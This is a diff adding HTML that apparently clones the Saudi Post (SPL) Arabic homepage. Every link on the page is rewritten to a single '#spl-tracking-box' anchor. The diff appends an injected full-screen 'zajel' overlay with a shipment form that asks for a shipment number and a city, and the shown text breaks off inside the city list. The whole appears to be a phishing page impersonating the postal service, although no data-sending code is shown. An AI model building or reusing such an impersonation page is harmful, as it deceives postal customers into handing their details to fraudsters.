+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear" preserveAspectRatio="xMidYMid slice">
+                <g id="lines" transform="translate(240.981 6.003)">
+                    <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
+                        <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
+                        <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
+                    </g>
+                    <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
+                </g>
+            </svg></section>
+
+<div class="covid_message d-flex flex-wrap" style="gap: 1rem;">
+<div class="container flex_me">
+<div><img src="https://splonline.com.sa/media/4030/questionnaire.png?width=0&amp;height=0" alt="" data-udi="umb://media/a4d574ea0b5c457a837a61f965d54bf9" /><span>رأيك يهمنا! قيّم تجربتك الرقمية مع سبل</span> <a href="#spl-tracking-box" class="btn linear_btn">قيّم تجربتك الآن</a> </div>
+</div>
+<div class="container flex_me">
+<div><img src="https://splonline.com.sa/media/2216/alert_icon.svg" alt="تنبيه أمني" /> <span>تحذير : لا يستخدم البريد الإلكتروني لسداد الفواتير!</span> <a href="#spl-tracking-box" class="btn linear_btn">اكتشف المزيد</a></div>
+</div>
+</div>
+
+
+
+
+            <section class="services">
+                                <div class="container">
+                        <div class="flex_me">
+                            <div class="col"><img src="https://splonline.com.sa/media/2209/national_address_icon.svg" alt="العنوان الوطني" /> <span>العنوان الوطني</span>
+<p style="height: 110px;">العنوان الوطني هو نظام عنونة دقيق يحدد مواقع الأفراد والمؤسسات سواء كانت شركات أو جهات حكومية بدقة.</p>
+<a href="#spl-tracking-box" class="btn_noBG">سّجل الآن</a></div>
+<div class="col"><img src="https://splonline.com.sa/media/2200/calc_icon.svg" alt="حاسبة الأسعار" /> <span>حاسبة الأسعار</span>
+<p style="height: 110px;">هل لديك شحنة أو طرد بحاجة إلى إرساله؟ أدخل وزن الشحنة ووجهتها واعرف تكاليف شحنتك ومدة التوصيل.</p>
+<a href="#spl-tracking-box" class="btn_noBG">احسب طردك</a></div>
+<div class="col"><img src="https://splonline.com.sa/media/2211/pay_icon.svg" alt="سداد الفواتير" /> <span>سداد الفواتير</span>
+<p style="height: 110px;">هل لديك فاتورة مستحقة؟ يمكنك دفع جميع فواتيرك البريدية بسهولة عبر الإنترنت.</p>
+<a href="#spl-tracking-box" class="btn_noBG">سدد فاتورتك</a></div>
+<div class="col"><img src="https://splonline.com.sa/media/2210/online_services_icon.svg" alt="منصة SMEs" /> <span>منصة SMEs</span>
+<p style="height: 110px;">منصة إلكترونية تمكنك من شراء باقة من 20 شحنة أو أكثر لإرسال شحناتك داخل المملكة بوزن يصل حتى 20 كيلو للشحنة.</p>
+<a href="#spl-tracking-box" class="btn_noBG">اختر باقتك</a></div>
+<p> </p>
+<p> </p>
+                        </div>
+                    </div>
+
+
+            </section>
+            <section id="nasherDiv" class="sending_has_never" style="">
+                <div class="container">
+                    <div class="flex_me">
+                        <div class="col"><span> <strong style="font-size: 50px;">الناشر التجاري</strong> <br />وثق وأدر جميع مواقعك في خرائط قوقل! </span>
+<p>عزز من وجودك على خرائط قوقل وتقديم مجموعة من المزايا التي تسمح لك بالنمو وإدارة عملك بشكل احترافي</p>
+<div class="section_btns flex_me"><a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">للمزيد من التفاصيل</a></div>
+</div>
+<div class="col"><img src="https://splonline.com.sa/media/2274/06homepagenasherar.jpg" alt="الناشر التجاري" /></div>
+                    </div>
+                </div>
+            </section>
+            <section class="g20_section">
+                                <div class="container">
+                        <div class="flex_me">
+                            <div class="col"><img src="https://splonline.com.sa/media/3338/mv1_ar.jpg" alt="عالمي" /></div>
+<div class="col"><span><strong style="font-size: 50px;">عالمي</strong><br /></span>
+<p>تسوّق من علاماتك التجارية المفضلة حول العالم، واستلم مشترياتك على عنوانك الوطني أو أي عنوان آخر.</p>
+<a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">ابدأ التسوّق</a></div>
+<p> </p>
+<p> </p>
+                        </div>
+                    </div>
+
+
+            </section>
+            <section id="tjariDiv" class="g20_section" style="">
+                <div class="container">
+                    <div class="flex_me">
+                        <div class="col"><img src="https://splonline.com.sa/media/2277/07homepagetijariar.jpg" alt="تجاري" /></div>
+<div class="col"><span> <strong style="font-size: 50px;">تجاري</strong><br />نوصلك وين ماتكون.. نوصلك وين ماتبي.. ورصيد إضافي 30%.. </span>
+<p>خدمة عصرية وموثوقة, تقدم عنوان سهل وواضح ومعياري للجهات التجارية لتحقيق تطلعات القطاع التجاري.</p>
+<a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">للمزيد من التفاصيل</a></div>
+<p> </p>
+                    </div>
+                </div>
+            </section>
+            <section class="moving_house">
+                                <div class="container">
+                        <div class="flex_me">
+                            <div class="col"><img src="https://splonline.com.sa/media/2361/na-ar.png" alt="عنوانك هويتك" /> <span>عنوانك هويتك</span>
+<p>يمكنك تسجيل عنوانك الوطني بالمجان وإدارته بكل يسر وسهولة.</p>
+<div class="section_btns"><a rel="noopener" href="#spl-tracking-box" target="_blank" class="btn primary_btn waves-effect waves-light">سجّل الآن</a></div>
+</div>
+<div class="col"><img src="https://splonline.com.sa/media/2451/smes-ar.jpg" alt="منصة SMEs للشحن المستمر" />  <span>هل تشحن باستمرار؟</span>
+<p>يمكنك توفير مايقارب 50٪ من قيمة الشحن عند استخدامك منصة SMEs.</p>
+<div class="section_btns"><a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">اختر الباقة المناسبة</a></div>
+</div>
+<p> </p>
+<p> </p>
+                        </div>
+                    </div>
+
+
+            </section>
+            <section class="find_branch">
+<div class="SA_map_wrapper" data-aos="fade-left">
+	<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="381.60400390625" viewBox="0 0 834 381.604" class="sa_map" preserveAspectRatio="xMidYMid slice">
+  <g id="Arabic-map-graphic" transform="translate(-686 -124.396)">
+    <g id="Group-9">
+      <path id="Stroke-1" d="M1181.355,214.712l25.288,35.083-6.2,6.156L1243.8,311.5l70.4,22.5-16.556,44.335L1253.1,400.2v14.63l-68.512,5.905-35.834,37.508-21.635-8.74-42.336-1.926-3.1,10.667L1056.8,469l-26.336-37.519L1014.087,398.4l-11.174-7.415" fill="none" stroke="#153c3f" stroke-width="12" class="svg-elem-14"></path>
+      <path id="Stroke-2" d="M1165.2,212.928l25.917,35.685-6.519,6.513,51.979,66.757,62.091,19.706-10.2,27.835L1241,392.925v10.859l-62.065,5.38-33.281,34.972-16.191-6.277-53.07-2.69-4.5,14.347L1061.1,454l-19.789-27.8-17.99-35.868-19.789-12.554" fill="none" stroke="#00c8e1" stroke-width="12" class="svg-elem-15"></path>
+      <path id="Stroke-3" d="M686.077,445H788.1l55,55h163.85V382.9L992.8,354.1l1.9-21-19.1-40.5-16.5,4.9-4.5-21.4-45.2-50.8h14.7l6.063-16.376,17.587.776,46.05-39.95-13.238-18.511L1000.6,144.2l93.007,55.6,47.979,4.124L1147.993,214H1520" fill="none" stroke="#153c3f" stroke-width="12" class="svg-elem-16"></path>
+      <path id="Stroke-5" d="M1520,202H1153.995l-6.3-9.02-50.369-4.491L1001.987,131l-40.476,14.372L977.7,167.829l-34.179,29.643-21.308-.887-6.431,16.707H882.615l60.908,68.344,6.553,31.109,19.058-5.684,13.27,28.123-1.8,20.744,14.309,29.743V488H848.037l-54.993-55H686" fill="none" stroke="#00c8e1" stroke-width="12" class="svg-elem-17"></path>
+    </g>
+  </g>
+</svg>
+</div>                                <div class="container find_branch_container flex_me">
+
+                        <div class="col"><span class="aos-init aos-animate" data-aos="fade-right" data-aos-delay="1500">أكثر من 450 فرع لخدمتكم <br>الآن أصبحنا أقرب لكم</span>
+<style>
+    .branch_finder a.btn_noBG:after {
+        content: url(../../Design/images/arrow_icon.svg);
+    }
+</style>
+
+<div class="track_trace branch_finder" data-aos="fade-left" data-aos-delay="1200">
+    <span>ابحث عن فرع البريد السعودي  | سبل</span>
+    <p>أدخل عنوانًا أو مدينة</p>
+    <div class="flex_me">
+        <div class="track_control">
+            <input id="findBranchInput" type="text" placeholder="ابحث هنا">
+            
+        </div>
+        <a onclick="branchesearch()" href="#" class="btn primary_btn" id="findBranchBtn">البحث</a>
+    </div>
+
+    
+	 <a href="#spl-tracking-box" class="btn_noBG">الفرع الأقرب</a>
+    <small class="text-muted" style="line-height: 1.5; display: block;">خريطة تفاعلية تمكنك من معرفة الفروع التابعة للأحياء ومقدمي الخدمة الأقرب لكل حي</small>
+</div>
+</div>
+<p> </p>
+<p> </p>
+<p> </p>
+
+                    </div>
+
+
+            </section>
+            <section class="downloadApp_banner">
+<div class="download_linear_wrap" data-aos="fade-left">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="340.43798828125" viewBox="0 0 1495.002 340.438" class="download_linear" preserveAspectRatio="xMidYMid slice">
+                    <g id="Group_1" data-name="Group 1" transform="translate(-212.499 -369.781)">
+                      <path id="Stroke_3" data-name="Stroke 3" d="M1707.5,614.78l-256,.091-40.5,40.5H877.5l-238.25-238.25H217.455" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-elem-20"></path>
+                      <path id="Stroke_5" data-name="Stroke 5" d="M1695.5,704.219H1376.4l-37.125-37.126H905.2v-55.9a25.074,25.074,0,0,0-25-25H825L614.59,375.781H431.5a11.29,11.29,0,0,0-6.854,2.8l-48.336,47.443a11.3,11.3,0,0,1-6.856,2.8H212.5" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-elem-21"></path>
+                    </g>
+                  </svg>
+
+
+        </div>                                <div class="container">
+                        <div class="flex_me">
+                            <div class="col"><img class="aos-init aos-animate" src="https://splonline.com.sa/media/3583/spl-app-new.png" alt="تطبيق سبل أون لاين" height="627" data-aos="fade-left" data-aos-delay="1300" /></div>
+<div class="col aos-init aos-animate" data-aos="fade-left" data-aos-delay="1500"><img src="https://splonline.com.sa/media/2198/app_icon.png" alt="أيقونة تطبيق سبل" /> <span>تطبيق سبل أون لاين</span>
+<p>استفد من خدمات سبل عبر التطبيق، واستمتع بتجربة أسهل وأسرع.</p>
+<h2>حمّل التطبيق الآن!</h2>
+<div class="section_btns"><a rel="noopener" href="#spl-tracking-box" target="_blank"><img src="https://splonline.com.sa/media/2199/app_store_btn.svg" alt="App Store" /></a> <a rel="noopener" href="#spl-tracking-box" target="_blank"><img src="https://splonline.com.sa/media/2205/google_play_btn.svg" alt="Google Play" /></a></div>
+</div>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+                        </div>
+                    </div>
+
+
+            </section>
+            <section class="contact_section">
+                                <div class="container">
+                        <div class="flex_me">
+                            <div class="col">
+<div class="d-flex d-md-block"><img src="https://splonline.com.sa/media/2201/careful_icon.svg" alt="تحذير أمني" /> <span>تحذير لعملائنا من الرسائل الاحتيالية</span></div>
+<p>نُجدّد تنويهنا لعملائنا الكرام بعدم التفاعل مع الرسائل الاحتيالية الواردة عبر البريد الإلكتروني، والتي تنتحل اسم وشعار مؤسسة البريد السعودي | سبل.</p>
+<div class="section_btns d-block d-md-inline mx-auto mx-md-0"><a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">للمزيد من التفاصيل</a> <a style="display: none;" href="#spl-tracking-box" class="btn_noBG">مساعدة ودعم</a></div>
+</div>
+<div class="col">
+<div class="d-flex d-md-block"><img src="https://splonline.com.sa/media/2202/contact_no.svg" alt="مركز العناية بالعملاء" /> <span>مركز العناية بالعملاء</span></div>
+<p>نسعد بخدمتكم بالرد على جميع طلباتكم واستفساراتكم عبر الرقم المجاني <a style="color: #00c8e1;" href="#spl-tracking-box">19992</a> ومن خارج المملكة <a style="color: #00c8e1;" dir="ltr" href="#spl-tracking-box">+966112898888</a></p>
+<div class="section_btns d-block d-md-inline mx-auto mx-md-0"><a href="#spl-tracking-box" class="btn primary_btn waves-effect waves-light">اتصل بنا </a> <a style="display: none;" href="#spl-tracking-box" class="btn_noBG">الشكاوى والطلبات</a></div>
+</div>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+                        </div>
+                    </div>
+
+
+            </section>
+
+
+
+    </div>
+    <!--Footer-->
+    <footer class="site-footer">
+        <div class="container">
+            <div class="flex_me">
+
+                <div class="col flex_me accordion js-accordion">
+        <div class="col footer_sitemap_col accordion__item js-accordion-item">
+            <span class="accordion-header js-accordion-header"> سبل</span>
+            <ul class="accordion-body js-accordion-body">
+                    <li>
+                        <a href="#spl-tracking-box" target="">عن المؤسسة </a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">كلمة معالي الرئيس </a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">مجلس الإدارة</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">القادة</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">الهيكل التنظيمي</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">استراتيجية البريد السعودي</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">المسؤولية الاجتماعية</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">محفظة الاستثمارات</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">فروعنا</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">الإستراتيجية والسياسات والأنظمة</a>
+                    </li>
+            </ul>
+        </div>
+        <div class="col footer_sitemap_col accordion__item js-accordion-item">
+            <span class="accordion-header js-accordion-header">المركز الإعلامي</span>
+            <ul class="accordion-body js-accordion-body">
+                    <li>
+                        <a href="#spl-tracking-box" target="">الأخبار</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">الفعاليات</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">الجوائز والإنجازات</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">التقارير السنوية</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">المنقولات</a>
+                    </li>
+            </ul>
+        </div>
+        <div class="col footer_sitemap_col accordion__item js-accordion-item">
+            <span class="accordion-header js-accordion-header">أخرى</span>
+            <ul class="accordion-body js-accordion-body">
+                    <li>
+                        <a href="#spl-tracking-box" target="_blank">التوظيف</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">المنافسات والمناقصات</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">التوعية بالاحتيال</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">البيانات المفتوحة</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">مشاركة البيانات</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">منصة المشاركة الإلكترونية</a>
+                    </li>
+            </ul>
+        </div>
+        <div class="col footer_sitemap_col accordion__item js-accordion-item">
+            <span class="accordion-header js-accordion-header">مواقع ذات علاقة</span>
+            <ul class="accordion-body js-accordion-body">
+                    <li>
+                        <a href="#spl-tracking-box" target="_blank">وزارة النقل والخدمات اللوجستية</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="_blank">الهيئة العامة للنقل</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="_blank">أبشر</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="_blank">ناقل</a>
+                    </li>
+                    <li>
+                        <a href="#spl-tracking-box" target="">المركز السعودي للتنافسية والأعمال</a>
+                    </li>
+            </ul>
+        </div>
+
+</div>
+
+                <div class="col">
+                    <div class="flex_me social_links">
+                            <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/facebook.svg" alt="https://www.facebook.com/SPL.KSA.online" /></a>
+                                                    <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/twitter-x.svg" height="34" style="height:34px;" alt="https://twitter.com/SPL_KSA_online" /></a>
+                                                    <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/youtube.svg" alt="https://www.youtube.com/user/saudipostch?feature=results_main" /></a>
+                                                    <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/linkedin.svg" alt="https://www.linkedin.com/company/spl-ksa-online" /></a>
+                                                    <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/instagram.svg" alt="https://instagram.com/spl_ksa_online?igshid=bv6ew3eo4lui" /></a>
+                        <a itemprop="sameAs" href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener"> <img src="https://splonline.com.sa/Design/images/whatsapp.png" width="22" height="22" alt="966112898888" /></a>
+                    </div>
+
+                    <div class="download-apps">
+                        <a href="#spl-tracking-box"><img src="https://splonline.com.sa/Design/images/google_play_btn.svg" alt=""></a>
+                        <a href="#spl-tracking-box"><img src="https://splonline.com.sa/Design/images/app_store_btn.svg" alt=""></a>
+                    </div>
+                    <div class="mt-4 d-flex justify-content-between align-items-center flex-wrap">
+                        <a href="#spl-tracking-box" target="_blank" rel="nofollow noreferrer noopener" style="flex: 0 0 17%;">
+                            <img src="https://splonline.com.sa/images/vat-logo.png" alt="شهادة ضريبة القيمة المضافة" width="74" height="95" class="img-fluid" style="">
+                        </a><a href="#spl-tracking-box" class="" style="flex: 0 0 70%;">
+                            <img src="https://raqmi.dga.gov.sa/PlatformsApi/api/Attachments/9aaf9156-37af-41c5-940f-b1f6011acb39">
+                        </a>
+                        <img src="https://splonline.com.sa/images/great-place-to-work-logo.png" width="100" height="166" class="img-fluid mx-auto" />
+                    </div>
+                </div>
+
+            </div>
+            <div class="flex_me align-items-center copyright">
+                <ul>
+                    <li><a href="#spl-tracking-box">شروط الخدمة </a></li>
+                    <li><a href="#spl-tracking-box">سياسة الخصوصية </a></li>
+                    <li><a href="#spl-tracking-box">إشعار الخصوصية
+ </a></li>
+                </ul>
+                <div class="d-flex align-items-center">
+                    <p class="mr-4">© 2026 جميع الحقوق محفوظة   البريد السعودي | سبل</p>
+                    <a href="#spl-tracking-box" target="_blank"><img src="https://splonline.com.sa/images/v2030.png" width="100" height="67" class="img-fluid" alt="Vision 2030" /></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!--/.Footer-->
+    <!-- CSS -->
+
+
+
+    <input type="hidden" id="apiUrl" />
+
+    <link href="/dist/css/jquery.fancybox.min.css" rel="stylesheet" />
+
+    <!--  SCRIPTS  -->
+    <script src="/dist/js/jquery.min.js"></script>
+    <script src="/dist/js/aos.min.js"></script>
+    <!-- JQuery -->
+    <script src="/dist/js/min.lib.min.js"></script>
+    <script src="/dist/js/main.min.js?v=1"></script>
+    <script>
+    var site = {};
+    site = {
+        utils: {
+            language: function () {
+                return {
+                    value: 0,
+                    langId: 1,
+                    url: site.utils.isRTL() ? 'ar' : 'en',
+                    locale: site.utils.isRTL() ? 'Arabic' : 'English',
+                    dir: site.utils.isRTL() ? 'rtl' : 'ltr'
+                };
+            },
+            isMobile: function () {
+                return document.body.clientWidth <= 992 ? true : false;
+            },
+            checkSize: function (_size) {
+                return document.body.clientWidth <= _size ? true : false;
+            },
+            isRTL: function () {
+                return window.location.pathname.split("/")[1] == "en" ? false : true;
+            }
+        },
+        messages: {
+            required: 'مطلوب',
+            maxChars: 'أقصى {0} حرفا سمح',
+            charLimits:  'يجب أن يكون {0} - {1} حرفا',
+            invalidEmail:  'بريد إلكتروني خاطئ',
+            invalidMobile: 'رقم الجوال غير صالح',
+            searchBoxPlaceholder:  'بحث',
+            noRecords:  'لا توجد نتائج',
+            noResults:  'لم يتم الحصول على أي نتائج',
+            noSplChars: 'الرجاء إدخال أحرف فقط',
+            mirRobot: 'Please verify that you are not a robot',
+            iisMalformed:  'The secret parameter is invalid or malformed',
+            iirResponse:  'The secret parameter is invalid or malformed',
+            misSecret: 'The secret parameter is missing',
+            uploadFileRequired: 'مطلوب',
+            uploadFileInvalidFormat: 'تنسيق غير صالح',
+            uploadFilesMaxlimit: 'أقصى 5 ملفات يمكن تحميلها',
+            uploadFileSizeMaxlimit: 'الحد الأقصى لحجم الملف هو 2 ميغابايت',
+            verify: 'تحقق',
+            verifying:  'جاري التحقق',
+            verified: 'تم التحقق.اكمل النموذج',
+            error:  'خطأ',
+            requiredTrackingNumber:  'أدخل رقم التتبع',
+            incorrectTrackingNumber: 'رقم التتبع غير صحيح',
+            noTrackingInfo: 'بانتظار استلام الشحنة من الجهة المصدرة لتوصيلها إلى العنوان الوطني المسجل في الطلب',
+			ticketAlreadyFound:'تم فتح بلاغ مسبقاً',
+            noAddrFound: 'لا يوجد عنوان تأسست في المنطقة المحددة. زيادة مستوى تكبير الخريطة لعرض الموقع التفصيلي',
+            first: 'أول',
+            prev: 'سابق',
+            next: 'التالى',
+            last: 'الاخير',
+            ActivateLocationService: 'عفواً، يجب تفعيل خدمة تحديد المواقع للمتابعة',
+            UnableToFindLocation:'عفواً، لم نستطع من تحديد موقعك',
+            EnableWiFiServiceToFindLocation: 'عفواً، لم نستطع تحديد موقعك، نرجو منك تفعيل الانترنت اللاسلكي Wi-Fi وخدمة تحديد المواقع عبر الأقمار الصناعية حتى نتمكن من تحديد موقعك‎',
+            ErrorInDetermineLocation: 'عفواً، حدث خطأ أثناء تحديد موقعك',
+            mapError: 'خطأ في تحميل الخريطة. قم بتحديث الصفحة إذا كنت ترغب في تحديد العنوان من الخريطة',
+            unknownStreet: 'شارع غير معروف',
+            customerCareCode7: 'لقد قمت بالفعل بإرسال التذكرة بنفس المشكلة'
+        }
+    }
+
+</script>
+    <!--<script src="~/resources/js/newsletter.js"></script>-->
+    <script src="/dist/js/jquery.slicknav.min.js"></script>
+    <script src="/dist/js/starter.min.js?v=3"></script>
+
+    <script>
+        /**
+        * Acive Menu Script
+        */
+        var CurrentPage = location.pathname;
+        if ((location.pathname != "/en/" && location.pathname != "/ar/")) {
+            $("nav li a[href*='" + CurrentPage + "']").parent("li").addClass("active");
+            $("nav li a[href*='" + window.location.pathname + "']").addClass("active");
+
+            $('nav li > a').each(function () {
+                var $this = $(this);
+                if ($this.attr('href') != undefined) {
+
+                    var loc = location.pathname;
+                    if (location.pathname.replace(/\/[^\/]*\.html$/, '').indexOf($(this).attr('href')) > -1) {
+                        $this.addClass('active');
+                    }
+                }
+            });
+        }
+        $(window).bind('load', function () {
+            $('#page-loader').toggleClass('d-flex d-none');
+        });
+
+
+    </script>
+    
+    <script src="/dist/js/vue-prod.min.js"></script>
+    <script src="/dist/js/track-trace-home.min.js?v=4"></script>
+
+    
+        <link href="/dist/css/smartbanner.min.css?v=2" rel="stylesheet" />
+        <script src="/dist/js/smartbanner.min.js"></script>
+    
+<style id="zajel-create-shipment-page-style">
+  #zajelCreateShipmentPage {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 1000000;
+    background: #f1f5f7;
+    overflow-y: auto;
+    direction: rtl;
+    text-align: right;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
+  }
+  #zajelCreateShipmentPage.open {
+    display: block;
+  }
+  .zajel-topbar {
+    background: linear-gradient(90deg, #093b44 0%, #0e5c6b 100%);
+    color: #ffffff;
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    position: sticky;
+    top: 0;
+    z-index: 20;
+    box-shadow: 0 4px 14px rgba(9, 59, 68, 0.22);
+  }
+  .zajel-brand-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 900;
+    font-size: 17px;
+  }
+  .zajel-pill {
+    background: #ffc20a;
+    color: #093b44;
+    font-weight: 900;
+    font-size: 12px;
+    padding: 3px 9px;
+    border-radius: 999px;
+  }
+  .zajel-back-btn {
+    background: rgba(255, 255, 255, 0.14);
+    color: #ffffff;
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    border-radius: 8px;
+    padding: 7px 13px;
+    font-size: 13px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+  .zajel-page-wrap {
+    max-width: 560px;
+    margin: 18px auto 36px;
+    padding: 0 14px;
+  }
+  .zajel-hero-card {
+    background: #0c4b56;
+    color: #ffffff;
+    border-radius: 14px;
+    padding: 18px 18px;
+    margin-bottom: 14px;
+    border-bottom: 4px solid #ffc20a;
+    box-shadow: 0 8px 20px rgba(12, 75, 86, 0.16);
+  }
+  .zajel-hero-card h2 {
+    margin: 0 0 6px;
+    font-size: 21px;
+    font-weight: 900;
+    color: #ffffff;
+  }
+  .zajel-hero-card p {
+    margin: 0;
+    font-size: 13.5px;
+    color: #d6eef2;
+    line-height: 1.6;
+  }
+  .zajel-shipment-num-bar {
+    margin-top: 12px;
+    background: rgba(255, 255, 255, 0.1);
+    border: 1px dashed #ffc20a;
+    border-radius: 10px;
+    padding: 10px 12px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .zajel-shipment-num-val {
+    font-family: "Courier New", monospace;
+    font-size: 19px;
+    font-weight: 900;
+    color: #ffc20a;
+    letter-spacing: 1.5px;
+  }
+  .zajel-regen-btn {
+    background: #ffc20a;
+    color: #093b44;
+    border: none;
+    border-radius: 7px;
+    padding: 6px 11px;
+    font-size: 12.5px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+  .zajel-form-card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 20px 18px;
+    box-shadow: 0 10px 24px rgba(15, 23, 42, 0.08);
+    border: 1px solid #e2e8f0;
+  }
+  .zajel-field-group {
+    margin-bottom: 14px;
+  }
+  .zajel-field-group label {
+    display: block;
+    font-size: 14px;
+    font-weight: 800;
+    color: #093b44;
+    margin-bottom: 6px;
+  }
+  .zajel-field-group label span.req {
+    color: #d97706;
+    margin-right: 3px;
+  }
+  .zajel-input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #cbd5e1;
+    border-radius: 9px;
+    font-size: 15px;
+    color: #0f172a;
+    background: #ffffff;
+    outline: none;
+    direction: rtl;
+    text-align: right;
+    transition: border-color 0.15s ease, box-shadow 0.15s ease;
+  }
+  select.zajel-input {
+    -webkit-appearance: menulist;
+    appearance: menulist;
+    direction: rtl;
+    text-align: right;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .zajel-input:focus {
+    border-color: #00a5b5;
+    box-shadow: 0 0 0 3px rgba(0, 165, 181, 0.14);
+  }
+  .zajel-submit-btn {
+    width: 100%;
+    margin-top: 8px;
+    background: #00a5b5;
+    color: #ffffff;
+    border: none;
+    border-radius: 10px;
+    padding: 13px 18px;
+    font-size: 16px;
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 0 6px 16px rgba(0, 165, 181, 0.28);
+  }
+  .zajel-submit-btn:hover {
+    background: #008c9a;
+  }
+  .zajel-error-msg {
+    display: none;
+    margin-top: 10px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    background: #fef2f2;
+    color: #b91c1c;
+    border: 1px solid #fecaca;
+    font-size: 13.5px;
+    font-weight: 700;
+  }
+  .zajel-success-box {
+    display: none;
+    margin-top: 16px;
+    background: #ecfdf5;
+    border: 1.5px solid #10b981;
+    border-radius: 12px;
+    padding: 16px;
+    color: #064e3b;
+  }
+  .zajel-success-box h3 {
+    margin: 0 0 10px;
+    font-size: 17px;
+    font-weight: 900;
+    color: #047857;
+  }
+  .zajel-summary-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    padding: 6px 0;
+    border-bottom: 1px dashed #a7f3d0;
+    font-size: 14px;
+  }
+  .zajel-summary-row:last-child {
+    border-bottom: none;
+  }
+</style>
+
+<div id="zajelCreateShipmentPage" role="dialog" aria-modal="true" aria-label="إنشاء شحنة جديدة - زاجل">
+  <div class="zajel-page-wrap">
+    <form class="zajel-form-card" id="zajelShipmentForm" novalidate>
+      <div class="zajel-field-group">
+        <label for="zajelShipmentNumberInput">رقم الشحنة <span class="req">*</span></label>
+        <input type="text" id="zajelShipmentNumberInput" class="zajel-input" maxlength="8" inputmode="numeric" dir="ltr" style="text-align:left;font-weight:800;" required />
+      </div>
+
+      <div class="zajel-field-group">
+        <label for="zajelCityInput">المدينة <span class="req">*</span></label>
+        <select id="zajelCityInput" class="zajel-input" required>
+          <option value="">اختر المدينة / المحافظة</option>
+          <optgroup label="منطقة الرياض">
+            <option value="الرياض">الرياض</option>
+            <option value="الدرعية">الدرعية</option>
+            <option value="الخرج">الخرج</option>
+            <option value="الدوادمي">الدوادمي</option>
+            <option value="المجمعة">المجمعة</option>
+            <option value="القويعية">القويعية</option>
+            <option value="وادي الدواسر">وادي الدواسر</option>
+            <option value="الأفلاج">الأفلاج</option>
+            <option value="الزلفي">الزلفي</option>
